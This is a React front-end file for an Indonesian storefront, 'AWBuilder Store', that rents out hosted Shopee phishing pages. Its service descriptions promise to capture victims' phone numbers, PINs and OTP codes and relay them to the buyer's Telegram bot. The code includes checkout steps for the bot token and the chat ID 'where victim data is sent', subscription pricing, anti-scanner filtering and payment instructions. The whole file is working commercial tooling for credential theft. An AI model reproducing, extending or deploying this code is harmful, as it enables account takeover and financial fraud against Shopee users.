import React, { useState, useEffect, useRef } from 'react';
import ReactDOM from 'react-dom/client';

// ── Helpers ────────────────────────────────────────────────────────────────

function formatRp(n) {
    return 'Rp ' + Number(n).toLocaleString('id-ID');
}

function calculatePrice(basePrice, duration) {
    if (!basePrice) return 0;
    const base = parseInt(basePrice, 10);
    switch (duration) {
        case '1_minggu': return base;
        case '1_bulan':
            return base <= 75000 ? Math.round(base * 3.5) : (base * 2) + 150000;
        case '3_bulan': return Math.round(calculatePrice(base, '1_bulan') * 3 * 0.9);
        case '6_bulan': return Math.round(calculatePrice(base, '1_bulan') * 6 * 0.8);
        case '1_tahun': return Math.round(calculatePrice(base, '1_bulan') * 12 * 0.7);
        default: return base;
    }
}

const DURATIONS = [
    { value: '1_minggu', label: '1 Minggu', badge: null },
    { value: '1_bulan',  label: '1 Bulan',  badge: null },
    { value: '3_bulan',  label: '3 Bulan',  badge: 'Hemat 10%' },
    { value: '6_bulan',  label: '6 Bulan',  badge: 'Hemat 20%' },
    { value: '1_tahun',  label: '1 Tahun',  badge: 'Hemat 30%' },
];

// ── Step indicators ─────────────────────────────────────────────────────────

function StepBar({ step }) {
    const steps = ['Pilih Layanan', 'Konfigurasi', 'Invoice & Bayar'];
    return (
        <div className="flex items-center justify-center gap-0 mb-10">
            {steps.map((label, i) => {
                const idx = i + 1;
                const active = step === idx;
                const done   = step > idx;
                return (
                    <React.Fragment key={idx}>
                        <div className="flex flex-col items-center">
                            <div className={`h-7 w-7 rounded-full flex items-center justify-center text-[11px] font-extrabold border transition-all ${
                                done   ? 'bg-emerald-500 border-emerald-500 text-black' :
                                active ? 'bg-white border-white text-black' :
                                         'bg-zinc-950 border-zinc-700 text-zinc-600'
                            }`}>
                                {done ? '✓' : idx}
                            </div>
                            <span className={`mt-1 text-[9px] uppercase tracking-widest font-bold ${
                                active ? 'text-white' : done ? 'text-emerald-500' : 'text-zinc-600'
                            }`}>{label}</span>
                        </div>
                        {i < steps.length - 1 && (
                            <div className={`h-px w-14 mb-4 transition-all ${done ? 'bg-emerald-500' : 'bg-zinc-800'}`} />
                        )}
                    </React.Fragment>
                );
            })}
        </div>
    );
}

// ── Service Card ────────────────────────────────────────────────────────────

const SERVICE_META = {
    'shopee-spam-nootp': {
        icon: '🔐',
        headline: 'Shopee Spam NO OTP',
        desc: 'Phishing halaman login Shopee tanpa verifikasi OTP. Tangkap nomor HP & PIN langsung ke bot Telegram Anda.',
        tags: ['Tanpa OTP', 'Login Only', 'Langsung Aktif'],
        color: 'from-orange-600/20 to-red-900/10',
        border: 'border-orange-800/50 hover:border-orange-500',
        activeBorder: 'border-orange-500',
        badgeColor: 'bg-orange-500/20 text-orange-300 border-orange-700/50',
    },
    'shopee-spam-otp': {
        icon: '📱',
        headline: 'Shopee Spam OTP',
        desc: 'Phishing halaman login Shopee lengkap dengan permintaan kode OTP. Tangkap nomor HP, PIN, dan OTP ke bot Telegram.',
        tags: ['Dengan OTP', 'Full Capture', 'Paling Lengkap'],
        color: 'from-red-600/20 to-rose-900/10',
        border: 'border-red-800/50 hover:border-red-500',
        activeBorder: 'border-red-500',
        badgeColor: 'bg-red-500/20 text-red-300 border-red-700/50',
    },
};

function ServiceCard({ template, selected, onSelect }) {
    const meta = SERVICE_META[template.key] || {};
    const isSelected = selected?.key === template.key;

    return (
        <div
            onClick={() => onSelect(template)}
            className={`relative cursor-pointer rounded-xl border bg-gradient-to-br ${meta.color || ''} p-5 flex flex-col gap-4 transition-all duration-200 ${
                isSelected ? `${meta.activeBorder} shadow-lg shadow-black/40` : `${meta.border || 'border-zinc-800 hover:border-zinc-600'}`
            }`}
        >
            {isSelected && (
                <span className="absolute top-3 right-3 h-5 w-5 bg-white rounded-full flex items-center justify-center text-[10px] text-black font-black">✓</span>
            )}
            <div className="flex items-center gap-3">
                <span className="text-3xl">{meta.icon || '📦'}</span>
                <div>
                    <span className="text-[10px] uppercase tracking-widest text-zinc-500 font-bold block">{template.category || 'SHOPEE'}</span>
                    <span className="text-sm font-extrabold text-white uppercase leading-tight block">{meta.headline || template.name}</span>
                </div>
            </div>
            <p className="text-zinc-400 text-[11px] leading-relaxed">{meta.desc || ''}</p>
            <div className="flex flex-wrap gap-1.5">
                {(meta.tags || []).map(t => (
                    <span key={t} className={`text-[9px] font-bold uppercase px-2 py-0.5 rounded border ${meta.badgeColor || 'bg-zinc-800 text-zinc-400 border-zinc-700'}`}>{t}</span>
                ))}
            </div>
            <div className="border-t border-white/5 pt-3 flex items-center justify-between">
                <div>
                    <span className="text-[9px] text-zinc-600 uppercase">Mulai dari</span>
                    <span className="text-white font-extrabold text-sm block">{template.price ? formatRp(template.price) : 'Hubungi Admin'}</span>
                    <span className="text-[9px] text-zinc-600">/ minggu</span>
                </div>
                <span className={`text-[10px] px-2.5 py-1 rounded font-bold uppercase tracking-wider transition-all ${
                    isSelected ? 'bg-white text-black' : 'bg-zinc-900 text-zinc-500 border border-zinc-800'
                }`}>
                    {isSelected ? 'Dipilih ✓' : 'Pilih'}
                </span>
            </div>
        </div>
    );
}

// ── Main Landing Component ──────────────────────────────────────────────────

function Landing() {
    const [step, setStep]                   = useState(1);
    const [templates, setTemplates]         = useState([]);
    const [loadingTpls, setLoadingTpls]     = useState(true);
    const [selected, setSelected]           = useState(null);

    // Form
    const [durasi, setDurasi]               = useState('1_bulan');
    const [slug, setSlug]                   = useState('');
    const [token, setToken]                 = useState('');
    const [chatId, setChatId]               = useState('');
    const [loading, setLoading]             = useState(false);
    const [alert, setAlert]                 = useState(null);

    // Step 3 result
    const [result, setResult]               = useState(null);

    // Slug validation live
    const [slugError, setSlugError]         = useState('');
    const [slugChecking, setSlugChecking]   = useState(false);
    const slugTimer                         = useRef(null);

    // ── Fetch templates ──────────────────────────────────────────────────────
    useEffect(() => {
        fetch('/api/public/templates')
            .then(r => r.json())
            .then(data => {
                // Filter + sort: shopee spam first
                const order = ['shopee-spam-nootp', 'shopee-spam-otp'];
                const sorted = [...data].sort((a, b) => {
                    const ia = order.indexOf(a.key), ib = order.indexOf(b.key);
                    if (ia !== -1 && ib !== -1) return ia - ib;
                    if (ia !== -1) return -1;
                    if (ib !== -1) return 1;
                    return 0;
                });
                setTemplates(sorted);
                if (sorted.length > 0) setSelected(sorted[0]);
            })
            .catch(() => {})
            .finally(() => setLoadingTpls(false));
    }, []);

    // ── Slug live check ──────────────────────────────────────────────────────
    const handleSlugChange = (val) => {
        setSlug(val);
        setSlugError('');
        clearTimeout(slugTimer.current);
        if (!val) return;
        const clean = val.trim().toLowerCase();
        if (!/^[a-z0-9](-?[a-z0-9])*$/.test(clean) || clean.length < 2 || clean.length > 63) {
            setSlugError('Format tidak valid. Gunakan huruf kecil, angka, dan tanda hubung saja.');
            return;
        }
        setSlugChecking(true);
        slugTimer.current = setTimeout(async () => {
            try {
                const r = await fetch('/api/public/deploy', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ service_key: selected?.key || '', durasi, client_slug_request: clean, telegram_token: '__check__', telegram_chat_id: '__check__' }),
                });
                const d = await r.json();
                // If error mentions "sudah aktif", slug is taken
                if (!d.success && d.error?.includes('sudah aktif')) {
                    setSlugError('Subdomain ini sudah digunakan. Coba nama lain.');
                } else {
                    setSlugError('');
                }
            } catch {}
            setSlugChecking(false);
        }, 700);
    };

    // ── Checkout submit ──────────────────────────────────────────────────────
    const handleCheckout = async (e) => {
        e.preventDefault();
        if (!selected) return setAlert({ type: 'error', message: 'Pilih layanan terlebih dahulu.' });

        const cleanSlug = slug.trim().toLowerCase();
        if (!cleanSlug) return setAlert({ type: 'error', message: 'Subdomain / Slug harus diisi.' });
        if (slugError) return setAlert({ type: 'error', message: slugError });

        setLoading(true);
        setAlert(null);

        try {
            const res = await fetch('/api/public/deploy', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    service_key: selected.key,
                    durasi,
                    client_slug_request: cleanSlug,
                    telegram_token: token,
                    telegram_chat_id: chatId,
                }),
            });
            const data = await res.json();

            if (data.success) {
                setResult(data);
                setStep(3);
                window.scrollTo({ top: 0, behavior: 'smooth' });
            } else {
                setAlert({ type: 'error', message: data.error || 'Gagal membuat pesanan.' });
            }
        } catch {
            setAlert({ type: 'error', message: 'Gagal menghubungi server. Coba lagi.' });
        } finally {
            setLoading(false);
        }
    };

    const totalPrice = selected ? calculatePrice(selected.price, durasi) : 0;

    // ─────────────────────────────────────────────────────────────────────────
    return (
        <div className="flex flex-col min-h-screen bg-[#0a0a0a] text-zinc-100 selection:bg-zinc-700 selection:text-white" style={{ fontFamily: "'Inter', 'Plus Jakarta Sans', sans-serif" }}>

            {/* ── Top Nav ── */}
            <header className="sticky top-0 z-40 border-b border-zinc-900 bg-black/80 backdrop-blur-md px-5 py-3.5 flex items-center justify-between">
                <div className="flex items-center gap-2.5">
                    <div className="h-8 w-8 rounded-lg bg-gradient-to-br from-orange-500 to-red-600 flex items-center justify-center text-sm font-black text-white">S</div>
                    <div>
                        <span className="font-black text-white text-sm tracking-tight block">AWBuilder Store</span>
                        <span className="text-[9px] text-zinc-500 tracking-widest uppercase -mt-0.5 block">Auto Deploy Service</span>
                    </div>
                </div>
                <div className="flex items-center gap-3">
                    <span className="hidden sm:flex items-center gap-1.5 text-[10px] text-emerald-400 font-bold uppercase">
                        <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse" />
                        Engine Online
                    </span>
                    <a
                        href="https://t.me/awbuilderadmin"
                        target="_blank" rel="noopener noreferrer"
                        className="text-[10px] font-bold uppercase tracking-wider px-3 py-1.5 rounded border border-zinc-700 text-zinc-400 hover:text-white hover:border-zinc-500 bg-zinc-900 hover:bg-zinc-800 transition-all"
                    >
                        Hubungi Admin
                    </a>
                </div>
            </header>

            <main className="flex-1 w-full max-w-4xl mx-auto px-5 py-10 md:py-16">

                {/* ── Step Bar ── */}
                <StepBar step={step} />

                {/* ── STEP 1: Service Selection ── */}
                {step === 1 && (
                    <div className="space-y-8">
                        <div className="text-center space-y-2">
                            <span className="text-[10px] uppercase tracking-[0.2em] text-orange-400 font-bold">Shopee Phishing Tools</span>
                            <h1 className="text-2xl md:text-3xl font-extrabold text-white tracking-tight">Pilih Layanan Yang Anda Butuhkan</h1>
                            <p className="text-zinc-500 text-xs max-w-sm mx-auto leading-relaxed">
                                Setiap instansi berjalan di server kami dengan bot Telegram Anda sendiri. Data target langsung masuk ke chat bot Anda.
                            </p>
                        </div>

                        {loadingTpls ? (
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                {[1,2].map(i => (
                                    <div key={i} className="h-64 rounded-xl border border-zinc-800 bg-zinc-900/50 animate-pulse" />
                                ))}
                            </div>
                        ) : (
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                {templates
                                    .filter(t => ['shopee-spam-nootp','shopee-spam-otp'].includes(t.key))
                                    .map(t => (
                                        <ServiceCard key={t.key} template={t} selected={selected} onSelect={setSelected} />
                                    ))
                                }
                                {templates.filter(t => !['shopee-spam-nootp','shopee-spam-otp'].includes(t.key)).map(t => (
                                    <ServiceCard key={t.key} template={t} selected={selected} onSelect={setSelected} />
                                ))}
                            </div>
                        )}

                        {/* CTA */}
                        <div className="flex justify-end">
                            <button
                                onClick={() => { if (selected) { setStep(2); window.scrollTo({ top: 0, behavior: 'smooth' }); } }}
                                disabled={!selected}
                                className="px-8 py-3 rounded-lg bg-white text-black font-extrabold uppercase text-xs tracking-widest hover:bg-zinc-200 disabled:opacity-30 disabled:cursor-not-allowed transition-all"
                            >
                                Lanjut Konfigurasi →
                            </button>
                        </div>

                        {/* Feature strip */}
                        <div className="grid grid-cols-2 md:grid-cols-4 gap-3 pt-4 border-t border-zinc-900">
                            {[
                                { icon: '⚡', title: 'Deploy Instan', desc: 'Aktif dalam hitungan menit' },
                                { icon: '🤖', title: 'Bot Telegram', desc: 'Data langsung ke chat Anda' },
                                { icon: '🔒', title: 'Server Kami', desc: 'Tidak perlu hosting sendiri' },
                                { icon: '🛡️', title: 'Anti-Bot Filter', desc: 'Dilindungi dari scanner' },
                            ].map(f => (
                                <div key={f.title} className="p-3 rounded-lg bg-zinc-950 border border-zinc-900 space-y-1">
                                    <span className="text-lg">{f.icon}</span>
                                    <span className="text-[11px] font-bold text-white block">{f.title}</span>
                                    <span className="text-[10px] text-zinc-600">{f.desc}</span>
                                </div>
                            ))}
                        </div>
                    </div>
                )}

                {/* ── STEP 2: Configuration Form ── */}
                {step === 2 && (
                    <div className="max-w-lg mx-auto space-y-6">
                        <div className="text-center space-y-1">
                            <span className="text-[10px] uppercase tracking-widest text-orange-400 font-bold">Konfigurasi Instansi</span>
                            <h2 className="text-xl font-extrabold text-white">Isi Detail Layanan Anda</h2>
                            <p className="text-zinc-500 text-xs">Semua data dikirim langsung ke bot Telegram milik Anda.</p>
                        </div>

                        {/* Selected service banner */}
                        {selected && (
                            <div className={`p-3 rounded-lg border flex items-center gap-3 bg-gradient-to-r ${SERVICE_META[selected.key]?.color || 'from-zinc-900'} ${SERVICE_META[selected.key]?.activeBorder || 'border-zinc-700'}`}>
                                <span className="text-2xl">{SERVICE_META[selected.key]?.icon || '📦'}</span>
                                <div>
                                    <span className="text-[9px] text-zinc-500 uppercase font-bold block">Layanan Terpilih</span>
                                    <span className="text-white font-extrabold text-xs uppercase">{SERVICE_META[selected.key]?.headline || selected.name}</span>
                                </div>
                                <button onClick={() => setStep(1)} className="ml-auto text-[10px] text-zinc-500 hover:text-white underline">Ganti</button>
                            </div>
                        )}

                        {alert && (
                            <div className={`p-3 rounded-lg border text-xs font-semibold ${alert.type === 'error' ? 'bg-red-950/40 border-red-800/50 text-red-300' : 'bg-emerald-950/40 border-emerald-800/50 text-emerald-300'}`}>
                                {alert.message}
                                <button className="float-right opacity-60 hover:opacity-100" onClick={() => setAlert(null)}>✕</button>
                            </div>
                        )}

                        <form onSubmit={handleCheckout} className="space-y-4">

                            {/* Duration */}
                            <div className="space-y-2">
                                <label className="text-[10px] font-bold text-zinc-400 uppercase tracking-wider block">Durasi Sewa</label>
                                <div className="grid grid-cols-3 md:grid-cols-5 gap-2">
                                    {DURATIONS.map(d => {
                                        const price = calculatePrice(selected?.price, d.value);
                                        const isActive = durasi === d.value;
                                        return (
                                            <button
                                                key={d.value}
                                                type="button"
                                                onClick={() => setDurasi(d.value)}
                                                className={`relative p-2 rounded-lg border text-center transition-all ${
                                                    isActive
                                                        ? 'bg-white text-black border-white'
                                                        : 'bg-zinc-900 text-zinc-400 border-zinc-800 hover:border-zinc-600 hover:text-white'
                                                }`}
                                            >
                                                {d.badge && (
                                                    <span className="absolute -top-2 left-1/2 -translate-x-1/2 text-[8px] bg-orange-500 text-white px-1.5 rounded font-bold whitespace-nowrap">{d.badge}</span>
                                                )}
                                                <span className={`text-[10px] font-bold block ${isActive ? 'text-black' : ''}`}>{d.label}</span>
                                                <span className={`text-[9px] ${isActive ? 'text-zinc-700' : 'text-zinc-500'}`}>{selected?.price ? formatRp(price) : '-'}</span>
                                            </button>
                                        );
                                    })}
                                </div>
                            </div>

                            {/* Slug */}
                            <div className="space-y-1.5">
                                <label className="text-[10px] font-bold text-zinc-400 uppercase tracking-wider block">Subdomain / Nama Toko</label>
                                <div className="flex items-center bg-zinc-900 border border-zinc-800 rounded-lg overflow-hidden focus-within:border-zinc-500 transition-all">
                                    <input
                                        type="text"
                                        required
                                        value={slug}
                                        onChange={e => handleSlugChange(e.target.value)}
                                        placeholder="namatoko"
                                        className="flex-1 bg-transparent px-3 py-2.5 text-white placeholder-zinc-700 focus:outline-none font-mono text-xs"
                                    />
                                    <span className="bg-zinc-950 text-zinc-500 px-3 py-2.5 border-l border-zinc-800 text-[10px] font-bold whitespace-nowrap">.mockbuild.shop</span>
                                </div>
                                {slugChecking && <span className="text-[10px] text-zinc-500">Memeriksa ketersediaan...</span>}
                                {slugError && <span className="text-[10px] text-red-400 block">{slugError}</span>}
                                {!slugError && !slugChecking && slug && <span className="text-[10px] text-emerald-400 block">✓ Format valid</span>}
                                <span className="text-[10px] text-zinc-600 block">Gunakan huruf kecil, angka, dan tanda hubung saja. Contoh: <span className="text-zinc-500 font-mono">toko-saya</span></span>
                            </div>

                            {/* Telegram Token */}
                            <div className="space-y-1.5">
                                <label className="text-[10px] font-bold text-zinc-400 uppercase tracking-wider block">Token Bot Telegram</label>
                                <input
                                    type="text"
                                    required
                                    value={token}
                                    onChange={e => setToken(e.target.value)}
                                    placeholder="123456789:AABBccDDee..."
                                    className="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-3 py-2.5 text-white placeholder-zinc-700 focus:outline-none focus:border-zinc-500 font-mono text-xs transition-all"
                                />
                                <span className="text-[10px] text-zinc-600">Dapatkan dari <span className="text-zinc-400">@BotFather</span> di Telegram.</span>
                            </div>

                            {/* Chat ID */}
                            <div className="space-y-1.5">
                                <label className="text-[10px] font-bold text-zinc-400 uppercase tracking-wider block">Chat ID Telegram</label>
                                <input
                                    type="text"
                                    required
                                    value={chatId}
                                    onChange={e => setChatId(e.target.value)}
                                    placeholder="987654321"
                                    className="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-3 py-2.5 text-white placeholder-zinc-700 focus:outline-none focus:border-zinc-500 font-mono text-xs transition-all"
                                />
                                <span className="text-[10px] text-zinc-600">ID chat/grup tempat data korban dikirimkan.</span>
                            </div>

                            {/* Price Summary + CTA */}
                            <div className="p-4 rounded-lg border border-zinc-800 bg-zinc-950 flex items-center justify-between">
                                <div>
                                    <span className="text-[10px] text-zinc-500 uppercase block">Total Pembayaran</span>
                                    <span className="text-white font-extrabold text-lg">{selected?.price ? formatRp(totalPrice) : '—'}</span>
                                    <span className="text-[10px] text-zinc-600 block">{DURATIONS.find(d => d.value === durasi)?.label}</span>
                                </div>
                                <div className="flex flex-col gap-2 items-end">
                                    <button
                                        type="submit"
                                        disabled={loading || !!slugError}
                                        className="px-6 py-2.5 rounded-lg bg-white text-black font-extrabold uppercase text-xs tracking-widest hover:bg-zinc-200 disabled:opacity-40 disabled:cursor-not-allowed transition-all"
                                    >
                                        {loading ? 'Memproses...' : 'Pesan Sekarang →'}
                                    </button>
                                    <button type="button" onClick={() => setStep(1)} className="text-[10px] text-zinc-500 hover:text-white">← Kembali</button>
                                </div>
                            </div>
                        </form>
                    </div>
                )}

                {/* ── STEP 3: Invoice & Payment ── */}
                {step === 3 && result && (
                    <div className="max-w-lg mx-auto space-y-6">
                        <div className="text-center space-y-1">
                            <div className="h-12 w-12 mx-auto rounded-full bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center text-2xl mb-3">🎉</div>
                            <h2 className="text-xl font-extrabold text-white">Pesanan Berhasil Dibuat!</h2>
                            <p className="text-zinc-500 text-xs">Lakukan pembayaran lalu kirim bukti transfer ke admin.</p>
                        </div>

                        {/* Invoice card */}
                        <div className="rounded-xl border border-zinc-800 bg-zinc-950 overflow-hidden">
                            <div className="px-5 py-3 border-b border-zinc-800 bg-zinc-900/50 flex items-center justify-between">
                                <span className="text-[10px] font-bold uppercase tracking-wider text-zinc-400">📄 Invoice Pesanan</span>
                                <span className="text-[10px] font-mono text-zinc-600">{result.lead_reference || `WEB-${Date.now()}`}</span>
                            </div>
                            <div className="p-5 space-y-3 text-xs">
                                {[
                                    ['Layanan', `${SERVICE_META[selected?.key]?.headline || selected?.name}`],
                                    ['Subdomain / URL', result.url || `https://${slug}.mockbuild.shop`],
                                    ['Durasi', DURATIONS.find(d => d.value === durasi)?.label],
                                    ['Status', '⏳ Menunggu Pembayaran'],
                                ].map(([label, value]) => (
                                    <div key={label} className="flex justify-between items-start gap-4">
                                        <span className="text-zinc-500 shrink-0">{label}:</span>
                                        <span className={`text-right font-semibold ${label === 'Status' ? 'text-yellow-400' : 'text-white'} break-all`}>{value}</span>
                                    </div>
                                ))}
                                <div className="border-t border-zinc-800 pt-3 flex justify-between items-center">
                                    <span className="text-zinc-400 font-bold uppercase">Total Bayar:</span>
                                    <span className="text-white font-extrabold text-base">{result.price ? formatRp(result.price) : formatRp(totalPrice)}</span>
                                </div>
                            </div>
                        </div>

                        {/* Payment instruction */}
                        <div className="rounded-xl border border-zinc-800 bg-zinc-950 overflow-hidden">
                            <div className="px-5 py-3 border-b border-zinc-800 bg-zinc-900/50">
                                <span className="text-[10px] font-bold uppercase tracking-wider text-zinc-400">💳 Instruksi Pembayaran</span>
                            </div>
                            <div className="p-5 flex flex-col sm:flex-row gap-5">
                                <div className="shrink-0 bg-white p-2 rounded-lg self-center sm:self-start">
                                    <img src="/logo/qris.png" alt="QRIS" className="h-28 w-28 object-contain" onError={e => e.target.style.display='none'} />
                                </div>
                                <div className="space-y-3">
                                    <span className="text-[11px] font-bold text-white uppercase block">Cara Bayar:</span>
                                    <ol className="space-y-2 text-[11px] text-zinc-400 list-none">
                                        {[
                                            'Scan kode QRIS di samping menggunakan aplikasi e-wallet atau mobile banking.',
                                            <span>Kirim bukti transfer ke Admin Telegram: <a href="https://t.me/awbuilderadmin" target="_blank" rel="noopener noreferrer" className="text-white font-bold underline">@awbuilderadmin</a></span>,
                                            'Sertakan subdomain / URL instansi Anda saat menghubungi admin.',
                                            'Setelah pembayaran diverifikasi, instansi akan langsung aktif otomatis.',
                                        ].map((step, i) => (
                                            <li key={i} className="flex gap-2">
                                                <span className="h-4 w-4 rounded-full bg-zinc-800 text-zinc-400 font-bold text-[9px] flex items-center justify-center shrink-0 mt-0.5">{i+1}</span>
                                                <span>{step}</span>
                                            </li>
                                        ))}
                                    </ol>
                                </div>
                            </div>
                        </div>

                        {/* Actions */}
                        <div className="flex flex-col sm:flex-row gap-3">
                            <button
                                onClick={() => { setStep(1); setResult(null); setSlug(''); setToken(''); setChatId(''); setAlert(null); }}
                                className="flex-1 px-5 py-2.5 rounded-lg border border-zinc-700 text-zinc-400 hover:text-white hover:border-zinc-500 bg-zinc-900 hover:bg-zinc-800 font-bold uppercase text-xs tracking-wider transition-all"
                            >
                                Pesan Layanan Lain
                            </button>
                            <a
                                href="https://t.me/awbuilderadmin"
                                target="_blank" rel="noopener noreferrer"
                                className="flex-1 px-5 py-2.5 rounded-lg bg-white text-black font-extrabold uppercase text-xs tracking-widest hover:bg-zinc-200 transition-all text-center"
                            >
                                Kirim Bukti ke Admin →
                            </a>
                        </div>
                    </div>
                )}
            </main>

            {/* ── Footer ── */}
            <footer className="border-t border-zinc-900 py-6 px-5 text-center text-[10px] text-zinc-700 font-mono uppercase tracking-widest">
                © {new Date().getFullYear()} AWBuilder — Auto Deployment Engine. All rights reserved.
            </footer>

            {/* Google Fonts */}
            <link rel="preconnect" href="https://fonts.googleapis.com" />
            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet" />
        </div>
    );
}

const root = ReactDOM.createRoot(document.getElementById('app'));
root.render(<Landing />);
